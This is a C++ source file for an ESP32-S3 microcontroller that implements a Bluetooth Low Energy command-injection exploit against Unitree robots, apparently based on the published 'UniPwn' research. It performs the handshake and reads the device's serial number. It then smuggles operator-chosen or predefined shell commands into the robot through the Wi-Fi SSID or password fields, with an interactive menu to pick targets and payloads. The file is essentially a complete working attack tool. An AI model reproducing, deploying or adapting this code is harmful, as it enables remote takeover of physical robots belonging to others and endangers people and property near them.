/*
 * Unitree Robot Exploitation Functions
 * Optimized for Seeed XIAO ESP32-S3
 * Implements the BLE connection and command injection exploit
 */

// Notification callback for BLE
static void notifyCallback(BLERemoteCharacteristic* pBLERemoteCharacteristic,
                          uint8_t* pData, size_t length, bool isNotify) {
    std::vector<uint8_t> encryptedData(pData, pData + length);
    std::vector<uint8_t> decrypted = decryptData(encryptedData);
    
    // Debug: Log all notifications
    String hexData = "";
    for (size_t i = 0; i < min((size_t)16, decrypted.size()); i++) {
        hexData += String(decrypted[i], HEX) + " ";
    }
    styledPrint("[NOTIFY] Received " + String(decrypted.size()) + " bytes: " + hexData, true);
    
    if (decrypted.size() < 5 || decrypted[0] != 0x51) {
        styledPrint("[-] Corrupted notification packet - opcode: " + String(decrypted.size() > 0 ? decrypted[0] : 0, HEX), true);
        return;
    }
    
    uint8_t responseType = decrypted[2];
    styledPrint("[NOTIFY] Response type (instruction): " + String(responseType), true);
    
    // Handle serial number chunks (instruction 2)
    if (responseType == 0x02) {
        uint8_t chunkIndex = decrypted[3];
        uint8_t totalChunks = decrypted[4];
        
        std::vector<uint8_t> chunkData(decrypted.begin() + 5, decrypted.end() - 1);
        serialChunks[chunkIndex] = chunkData;
        
        styledPrint("Received serial chunk " + String(chunkIndex) + "/" + String(totalChunks), true);
        
        // Check if we have all chunks
        if (serialChunks.size() == totalChunks) {
            String serialNumber = "";
            for (uint8_t i = 1; i <= totalChunks; i++) {
                for (uint8_t byte : serialChunks[i]) {
                    if (byte != 0) serialNumber += (char)byte;
                }
            }
            styledPrint("Serial number: " + serialNumber);
            serialChunks.clear();
        }
        // Set notification flag for serial chunks too
        notificationReceived = true;
    } else {
        // Store general response
        styledPrint("[NOTIFY] Setting notification flag for instruction " + String(responseType), true);
        receivedNotification = decrypted;
        notificationReceived = true;
    }
}

bool connectToDevice(const UnitreeDevice& device) {
    styledPrint("Connecting to " + device.name + " (" + device.address + ")");
    
    if (pClient) {
        pClient->disconnect();
        delete pClient;
        pClient = nullptr;
    }
    
    pClient = BLEDevice::createClient();
    BLEAddress address(device.address.c_str());
    
    if (!pClient->connect(address)) {
        styledPrint("[-] Failed to connect to device");
        return false;
    }
    
    deviceConnected = true;
    styledPrint("Connected successfully", true);
    
    // Get the service
    BLERemoteService* pRemoteService = pClient->getService(BLEUUID(UNITREE_SERVICE_UUID));
    if (!pRemoteService) {
        styledPrint("[-] Failed to find Unitree service");
        pClient->disconnect();
        return false;
    }
    
    // Get characteristics with error handling
    try {
        pWriteChar = pRemoteService->getCharacteristic(BLEUUID(CUSTOM_CHAR_UUID_2));
        pNotifyChar = pRemoteService->getCharacteristic(BLEUUID(CUSTOM_CHAR_UUID));
        
        if (!pWriteChar || !pNotifyChar) {
            styledPrint("[-] Failed to find required characteristics, trying backup method");
            // Try to continue anyway - some devices work even with characteristic errors
        }
        
        // Register for notifications with error handling (matching Python fallback)
        if (pNotifyChar && pNotifyChar->canNotify()) {
            pNotifyChar->registerForNotify(notifyCallback);
            styledPrint("Notification handler registered", true);
        } else {
            styledPrint("[-] Primary notification hook failed, trying backup method", true);
            // Try to continue anyway - Python uses handle 13 as backup
            // ESP32 BLE library handles this differently, but we'll try to continue
        }
    } catch (...) {
        styledPrint("[-] Characteristic discovery failed, but continuing", true);
    }
    
    return true;
}

bool waitForNotification(uint32_t timeoutMs = 5000) {
    notificationReceived = false;
    unsigned long startTime = millis();
    
    while (!notificationReceived && (millis() - startTime) < timeoutMs) {
        delay(10);
    }
    
    return notificationReceived;
}

bool sendHandshake() {
    if (!pWriteChar) {
        styledPrint("[-] Write characteristic not available for handshake");
        return false;
    }
    
    // Try multiple payload variants observed in different firmware builds (per UniPwn write-up)
    // Variant A: payload = "unitree"
    // Variant B: payload = 0x00 0x00 + "unitree"
    // Variant C: payload = "unitree" + 0x00
    struct Variant { const char* name; std::vector<uint8_t> bytes; };
    std::vector<Variant> variants;
    variants.push_back({"A", std::vector<uint8_t>(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end())});
    {
        std::vector<uint8_t> b = {0x00, 0x00};
        b.insert(b.end(), HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end());
        variants.push_back({"B", b});
    }
    {
        std::vector<uint8_t> c(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end());
        c.push_back(0x00);
        variants.push_back({"C", c});
    }
    
    const int maxAttemptsPerVariant = 2;
    for (auto &v : variants) {
        for (int attempt = 1; attempt <= maxAttemptsPerVariant; attempt++) {
            styledPrint("[BLE] Handshake variant " + String(v.name) + ", attempt " + String(attempt));
            // Use correct handshake format from UniPwn: [0, 0] + handshake_bytes
            std::vector<uint8_t> handshakeData = {0, 0};
            handshakeData.insert(handshakeData.end(), v.bytes.begin(), v.bytes.end());
            std::vector<uint8_t> packet = createPacket(0x01, handshakeData);

            // Try PLAINTEXT first (observed in some builds)
            styledPrint("[BLE] Trying PLAINTEXT handshake (bytes=" + String(packet.size()) + ")", true);
            pWriteChar->writeValue(packet.data(), packet.size(), false); // Keep original handshake logic
            if (waitForNotification()) {
                // Accept instruction 0 or 1 as valid handshake response
                if (genericResponseValidator(receivedNotification, 0x01) || 
                    genericResponseValidator(receivedNotification, 0x00)) {
                    styledPrint("[BLE] Handshake successful (PLAINTEXT) variant " + String(v.name));
                    return true;
                }
            }

            // Then try ENCRYPTED fallback
            std::vector<uint8_t> encrypted = encryptData(packet);
            styledPrint("[BLE] Trying ENCRYPTED handshake (bytes=" + String(encrypted.size()) + ")", true);
            pWriteChar->writeValue(encrypted.data(), encrypted.size(), false); // Short write
            if (waitForNotification()) {
                // Accept instruction 0 or 1 as valid handshake response
                if (genericResponseValidator(receivedNotification, 0x01) || 
                    genericResponseValidator(receivedNotification, 0x00)) {
                    styledPrint("[BLE] Handshake successful (ENCRYPTED) variant " + String(v.name));
                    return true;
                }
            }

            styledPrint("[-] Handshake attempt failed for variant " + String(v.name));
            delay(150);
        }
    }
    return false;
}

bool getSerialNumber() {
    styledPrint("Getting serial number...", true);
    
    std::vector<uint8_t> packet = createPacket(2, {0});
    pWriteChar->writeValue(packet.data(), packet.size(), false); // Keep original serial logic
    
    // Wait a bit longer for serial number chunks
    delay(1000);
    
    return true; // Serial number is handled in notification callback
}

bool initializeWifi(uint8_t mode = 2) {
    styledPrint("Initializing WiFi mode " + String(mode == 1 ? "AP" : mode == 2 ? "STA" : String(mode)), true);
    
    std::vector<uint8_t> packet = createPacket(3, {mode});
    pWriteChar->writeValue(packet.data(), packet.size(), true); // Match Python: response=True
    
    if (!waitForNotification(5000)) { // 5 second timeout (matches Python)
        styledPrint("[-] WiFi initialization timeout");
        return false; // Fail if no response (matches Python behavior)
    }
    
    if (!genericResponseValidator(receivedNotification, 3)) {
        styledPrint("[-] WiFi initialization response invalid");
        return false; // Fail if invalid response (matches Python behavior)
    }
    
    styledPrint("[WIFI] WiFi initialization successful", true);
    return true;
}

bool sendChunkedData(uint8_t instruction, const String& data) {
    if (!pWriteChar) {
        styledPrint("[-] Write characteristic not available");
        return false;
    }
    
    styledPrint("[BLE] Preparing chunked send: instr=" + String(instruction) + ", bytes=" + String(data.length()));
    std::vector<uint8_t> dataBytes(data.begin(), data.end());
    uint8_t totalChunks = (dataBytes.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    
    styledPrint("[BLE] Sending " + String(totalChunks) + " chunks for instruction " + String(instruction), true);
    
    for (uint8_t i = 0; i < totalChunks; i++) {
        size_t start = i * CHUNK_SIZE;
        size_t end = min((size_t)(start + CHUNK_SIZE), dataBytes.size());
        
        std::vector<uint8_t> chunk(dataBytes.begin() + start, dataBytes.begin() + end);
        std::vector<uint8_t> packetData = {(uint8_t)(i + 1), totalChunks};
        packetData.insert(packetData.end(), chunk.begin(), chunk.end());
        
        std::vector<uint8_t> packet = createPacket(instruction, packetData);
        styledPrint("[BLE] Chunk " + String(i+1) + "/" + String(totalChunks) + ", size=" + String(chunk.size()) + ", encrypted_size=" + String(packet.size()));
        
        // Log the actual data being sent for debugging
        String chunkContent = "";
        for (size_t j = 0; j < min((size_t)10, chunk.size()); j++) {
            chunkContent += String(chunk[j], HEX) + " ";
        }
        if (chunk.size() > 10) chunkContent += "...";
        styledPrint("[BLE] Chunk data: " + chunkContent, true);
        
        // Debug: Log the actual packet being sent
        String packetHex = "";
        for (size_t j = 0; j < min((size_t)16, packet.size()); j++) {
            packetHex += String(packet[j], HEX) + " ";
        }
        styledPrint("[BLE] Sending packet (encrypted): " + packetHex, true);
        
        // Match Python implementation: use response=True for BLE writes
        styledPrint("[BLE] Writing chunk packet of size " + String(packet.size()) + " bytes", true);
        pWriteChar->writeValue(packet.data(), packet.size(), true); // true = response required (matches Python)
        
        // Match original Python: NO delay for SSID (instruction 4), 100ms delay for password (instruction 5)
        if (instruction == 5) {
            delay(100); // 100ms sleep for password chunks ONLY (matches Python asyncio.sleep(0.1))
        }
        
        // Only wait for response on last chunk (EXACTLY matching Python)
        if (i + 1 == totalChunks) {
            styledPrint("[BLE] Waiting for final chunk acknowledgment...", true);
            
            // Use EXACT Python timeouts: 5s for password, 10s default
            int timeout = (instruction == 5) ? 5000 : 10000;
            
            if (!waitForNotification(timeout)) {
                styledPrint("[-] Chunk transmission timeout - no response from device");
                return false;
            }
            
            styledPrint("[BLE] Got response, validating...", true);
            if (!genericResponseValidator(receivedNotification, instruction)) {
                styledPrint("[-] Chunk transmission failed: invalid response for instruction " + String(instruction));
                return false;
            }
            
            styledPrint("[BLE] Chunked data transmission successful", true);
        }
    }
    
    return true;
}

bool setSSID(const String& ssid) {
    styledPrint("[WIFI] Setting SSID (length=" + String(ssid.length()) + ")", true);
    return sendChunkedData(4, ssid);
}

bool setPassword(const String& password) {
    styledPrint("[WIFI] Setting password (length=" + String(password.length()) + ")", true);
    return sendChunkedData(5, password);
}

bool setCountryCode() {
    styledPrint("[WIFI] Setting country code: " + COUNTRY_CODE, true);
    
    std::vector<uint8_t> countryBytes(COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    countryBytes.push_back(0); // Null terminator
    
    // Use UniPwn format: [1] + country_bytes
    std::vector<uint8_t> dataBytes = {1};
    dataBytes.insert(dataBytes.end(), countryBytes.begin(), countryBytes.end());
    
    std::vector<uint8_t> packet = createPacket(6, dataBytes);
    pWriteChar->writeValue(packet.data(), packet.size(), false); // Keep original country code logic
    
    if (!waitForNotification()) {
        styledPrint("[-] Country code timeout");
        return false;
    }
    
    if (!genericResponseValidator(receivedNotification, 6)) {
        styledPrint("[-] Country code failed");
        return false;
    }
    
    styledPrint("Exploit triggered! Command should execute now.");
    return true;
}

bool exploitSequence(const String& ssid, const String& password) {
    styledPrint("[EXPLOIT] Starting exploitation sequence");
    
    // Step 1: Handshake
    if (!sendHandshake()) {
        return false;
    }
    
    // Step 2: Get serial number (verification)
    getSerialNumber();
    
    // Step 3: Initialize WiFi (per UniPwn research - required step)
    styledPrint("[EXPLOIT] WiFi initialization (instruction 3)");
    initializeWifi(2); // STA mode - continue regardless of response
    
    // Step 4: Set SSID (normal WiFi name, no injection here)
    if (!setSSID(ssid)) {
        styledPrint("[-] SSID stage failed");
        return false;
    }
    
    // Step 5: Set password (normal password, no injection here)
    if (!setPassword(password)) {
        styledPrint("[-] Password stage failed");
        return false;
    }
    
    // Step 6: Set country code (normal country code - command already injected via SSID)
    if (!setCountryCode()) {
        styledPrint("[-] Country code stage failed");
        return false;
    }
    
    styledPrint("Exploitation complete!");
    return true;
}

void selectAndExploitDevice() {
    // First show available devices
    std::vector<UnitreeDevice> allDevices = discoveredDevices;
    allDevices.insert(allDevices.end(), recentDevices.begin(), recentDevices.end());
    
    if (allDevices.empty()) {
        styledPrint("[-] No devices available. Run a scan first.");
        return;
    }
    
    // Remove duplicates
    for (auto it = allDevices.begin(); it != allDevices.end(); ++it) {
        for (auto it2 = it + 1; it2 != allDevices.end();) {
            if (it->address == it2->address) {
                it2 = allDevices.erase(it2);
            } else {
                ++it2;
            }
        }
    }
    
    Serial.println("\nAvailable devices:");
    for (size_t i = 0; i < allDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + allDevices[i].name + 
                      " (" + allDevices[i].address + ")");
    }
    
    Serial.print("\n\033[1;32m[//] Select device (1-" + String(allDevices.size()) + "): \033[0m");
    
    // Wait for user input
    while (!Serial.available()) {
        delay(100);
    }
    
    int deviceChoice = Serial.parseInt();
    if (deviceChoice < 1 || deviceChoice > (int)allDevices.size()) {
        styledPrint("[-] Invalid device selection");
        return;
    }
    
    UnitreeDevice selectedDevice = allDevices[deviceChoice - 1];
    
    // Connect to device
    if (!connectToDevice(selectedDevice)) {
        return;
    }
    
    // Add to recent devices
    addRecentDevice(selectedDevice);
    
    // Show exploitation options
    Serial.println("\nExploitation options:");
    Serial.println("1. Command injection only (via SSID)");
    Serial.println("2. Command injection + WiFi config (via password)");
    Serial.println("3. WiFi configuration only (no injection)");
    
    Serial.print("\n\033[1;32m[//] Select option (1-3): \033[0m");
    
    while (!Serial.available()) {
        delay(100);
    }
    
    int exploitChoice = Serial.parseInt();
    
    String ssid = "";
    String password = "";
    String command = "";
    
    if (exploitChoice == 3) {
        // WiFi only
        Serial.print("\n\033[1;32m[//] Enter WiFi SSID: \033[0m");
        while (!Serial.available()) delay(100);
        ssid = Serial.readString();
        ssid.trim();
        
        Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
        while (!Serial.available()) delay(100);
        password = Serial.readString();
        password.trim();
    } else {
        // Show command options
        Serial.println("\nAvailable commands:");
        for (size_t i = 0; i < predefinedCmds.size(); i++) {
            Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                          " - " + predefinedCmds[i].description);
        }
        Serial.println("  " + String(predefinedCmds.size() + 1) + ". Custom command");
        
        Serial.print("\n\033[1;32m[//] Select command (1-" + String(predefinedCmds.size() + 1) + "): \033[0m");
        
        while (!Serial.available()) delay(100);
        int cmdChoice = Serial.parseInt();
        
        if (cmdChoice >= 1 && cmdChoice <= (int)predefinedCmds.size()) {
            command = predefinedCmds[cmdChoice - 1].cmd;
            styledPrint("Selected: " + predefinedCmds[cmdChoice - 1].name);
        } else if (cmdChoice == (int)predefinedCmds.size() + 1) {
            Serial.print("\033[1;32m[//] Enter custom command: \033[0m");
            while (!Serial.available()) delay(100);
            command = Serial.readString();
            command.trim();
        } else {
            styledPrint("[-] Invalid command selection");
            if (pClient) pClient->disconnect();
            return;
        }
        
        if (exploitChoice == 1) {
            // Command via SSID
            ssid = buildPwn(command);
            password = "";
        } else if (exploitChoice == 2) {
            // Command via password + WiFi config
            Serial.print("\033[1;32m[//] Enter WiFi SSID: \033[0m");
            while (!Serial.available()) delay(100);
            ssid = Serial.readString();
            ssid.trim();
            
            Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
            while (!Serial.available()) delay(100);
            password = Serial.readString();
            password.trim();
            password += buildPwn(command);
        }
    }
    
    // Execute exploit
    styledPrint("Executing exploit...");
    bool success = exploitSequence(ssid, password);
    
    if (success) {
        styledPrint("Exploit completed successfully!");
    } else {
        styledPrint("[-] Exploit failed");
    }
    
    // Disconnect
    if (pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
}

void exploitDevice(const String& ssid, const String& password) {
    styledPrint("[EXPLOIT] Starting WiFi configuration exploit...");
    styledPrint("[EXPLOIT] Target SSID length=" + String(ssid.length()));
    
    if (!deviceConnected || !pWriteChar || !pNotifyChar) {
        styledPrint("[-] Device not properly connected");
        return;
    }
    
    // Send handshake
    std::vector<uint8_t> handshake = createPacket(0x01, 
        std::vector<uint8_t>(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end()));
    
    std::vector<uint8_t> encrypted = encryptData(handshake);
    
    pWriteChar->writeValue(encrypted.data(), encrypted.size(), false); // Short write
    if (!waitForNotification()) {
        styledPrint("[-] Handshake failed");
        return;
    }
    
    styledPrint("[BLE] Handshake successful");
    
    // Build and send WiFi configuration (combined packet path)
    std::vector<uint8_t> wifiData;
    
    // Add SSID
    wifiData.insert(wifiData.end(), ssid.begin(), ssid.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add password
    wifiData.insert(wifiData.end(), password.begin(), password.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add country code
    wifiData.insert(wifiData.end(), COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    wifiData.push_back(0x00);  // Null terminator
    
    std::vector<uint8_t> wifiPacket = createPacket(0x04, wifiData);
    std::vector<uint8_t> encryptedWifi = encryptData(wifiPacket);
    
    styledPrint("[BLE] Writing WiFi packet (bytes=" + String(encryptedWifi.size()) + ")", true);
    pWriteChar->writeValue(encryptedWifi.data(), encryptedWifi.size(), false); // Short write
    if (!waitForNotification()) {
        styledPrint("[-] WiFi configuration timeout");
        return;
    }
    
    styledPrint("[WIFI] Configuration acknowledged by target");
    styledPrint("[EXPLOIT] Payload delivered");
}

// Handshake-only helper for web AutoPwn step verification
bool performHandshake(const UnitreeDevice& device) {
    styledPrint("[BLE] Handshake-only verification start");
    if (!connectToDevice(device)) {
        styledPrint("[-] Unable to connect for handshake");
        return false;
    }
    bool ok = sendHandshake();
    if (pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
    styledPrint(ok ? "[BLE] Handshake-only verification OK" : "[-] Handshake-only verification FAILED");
    return ok;
}
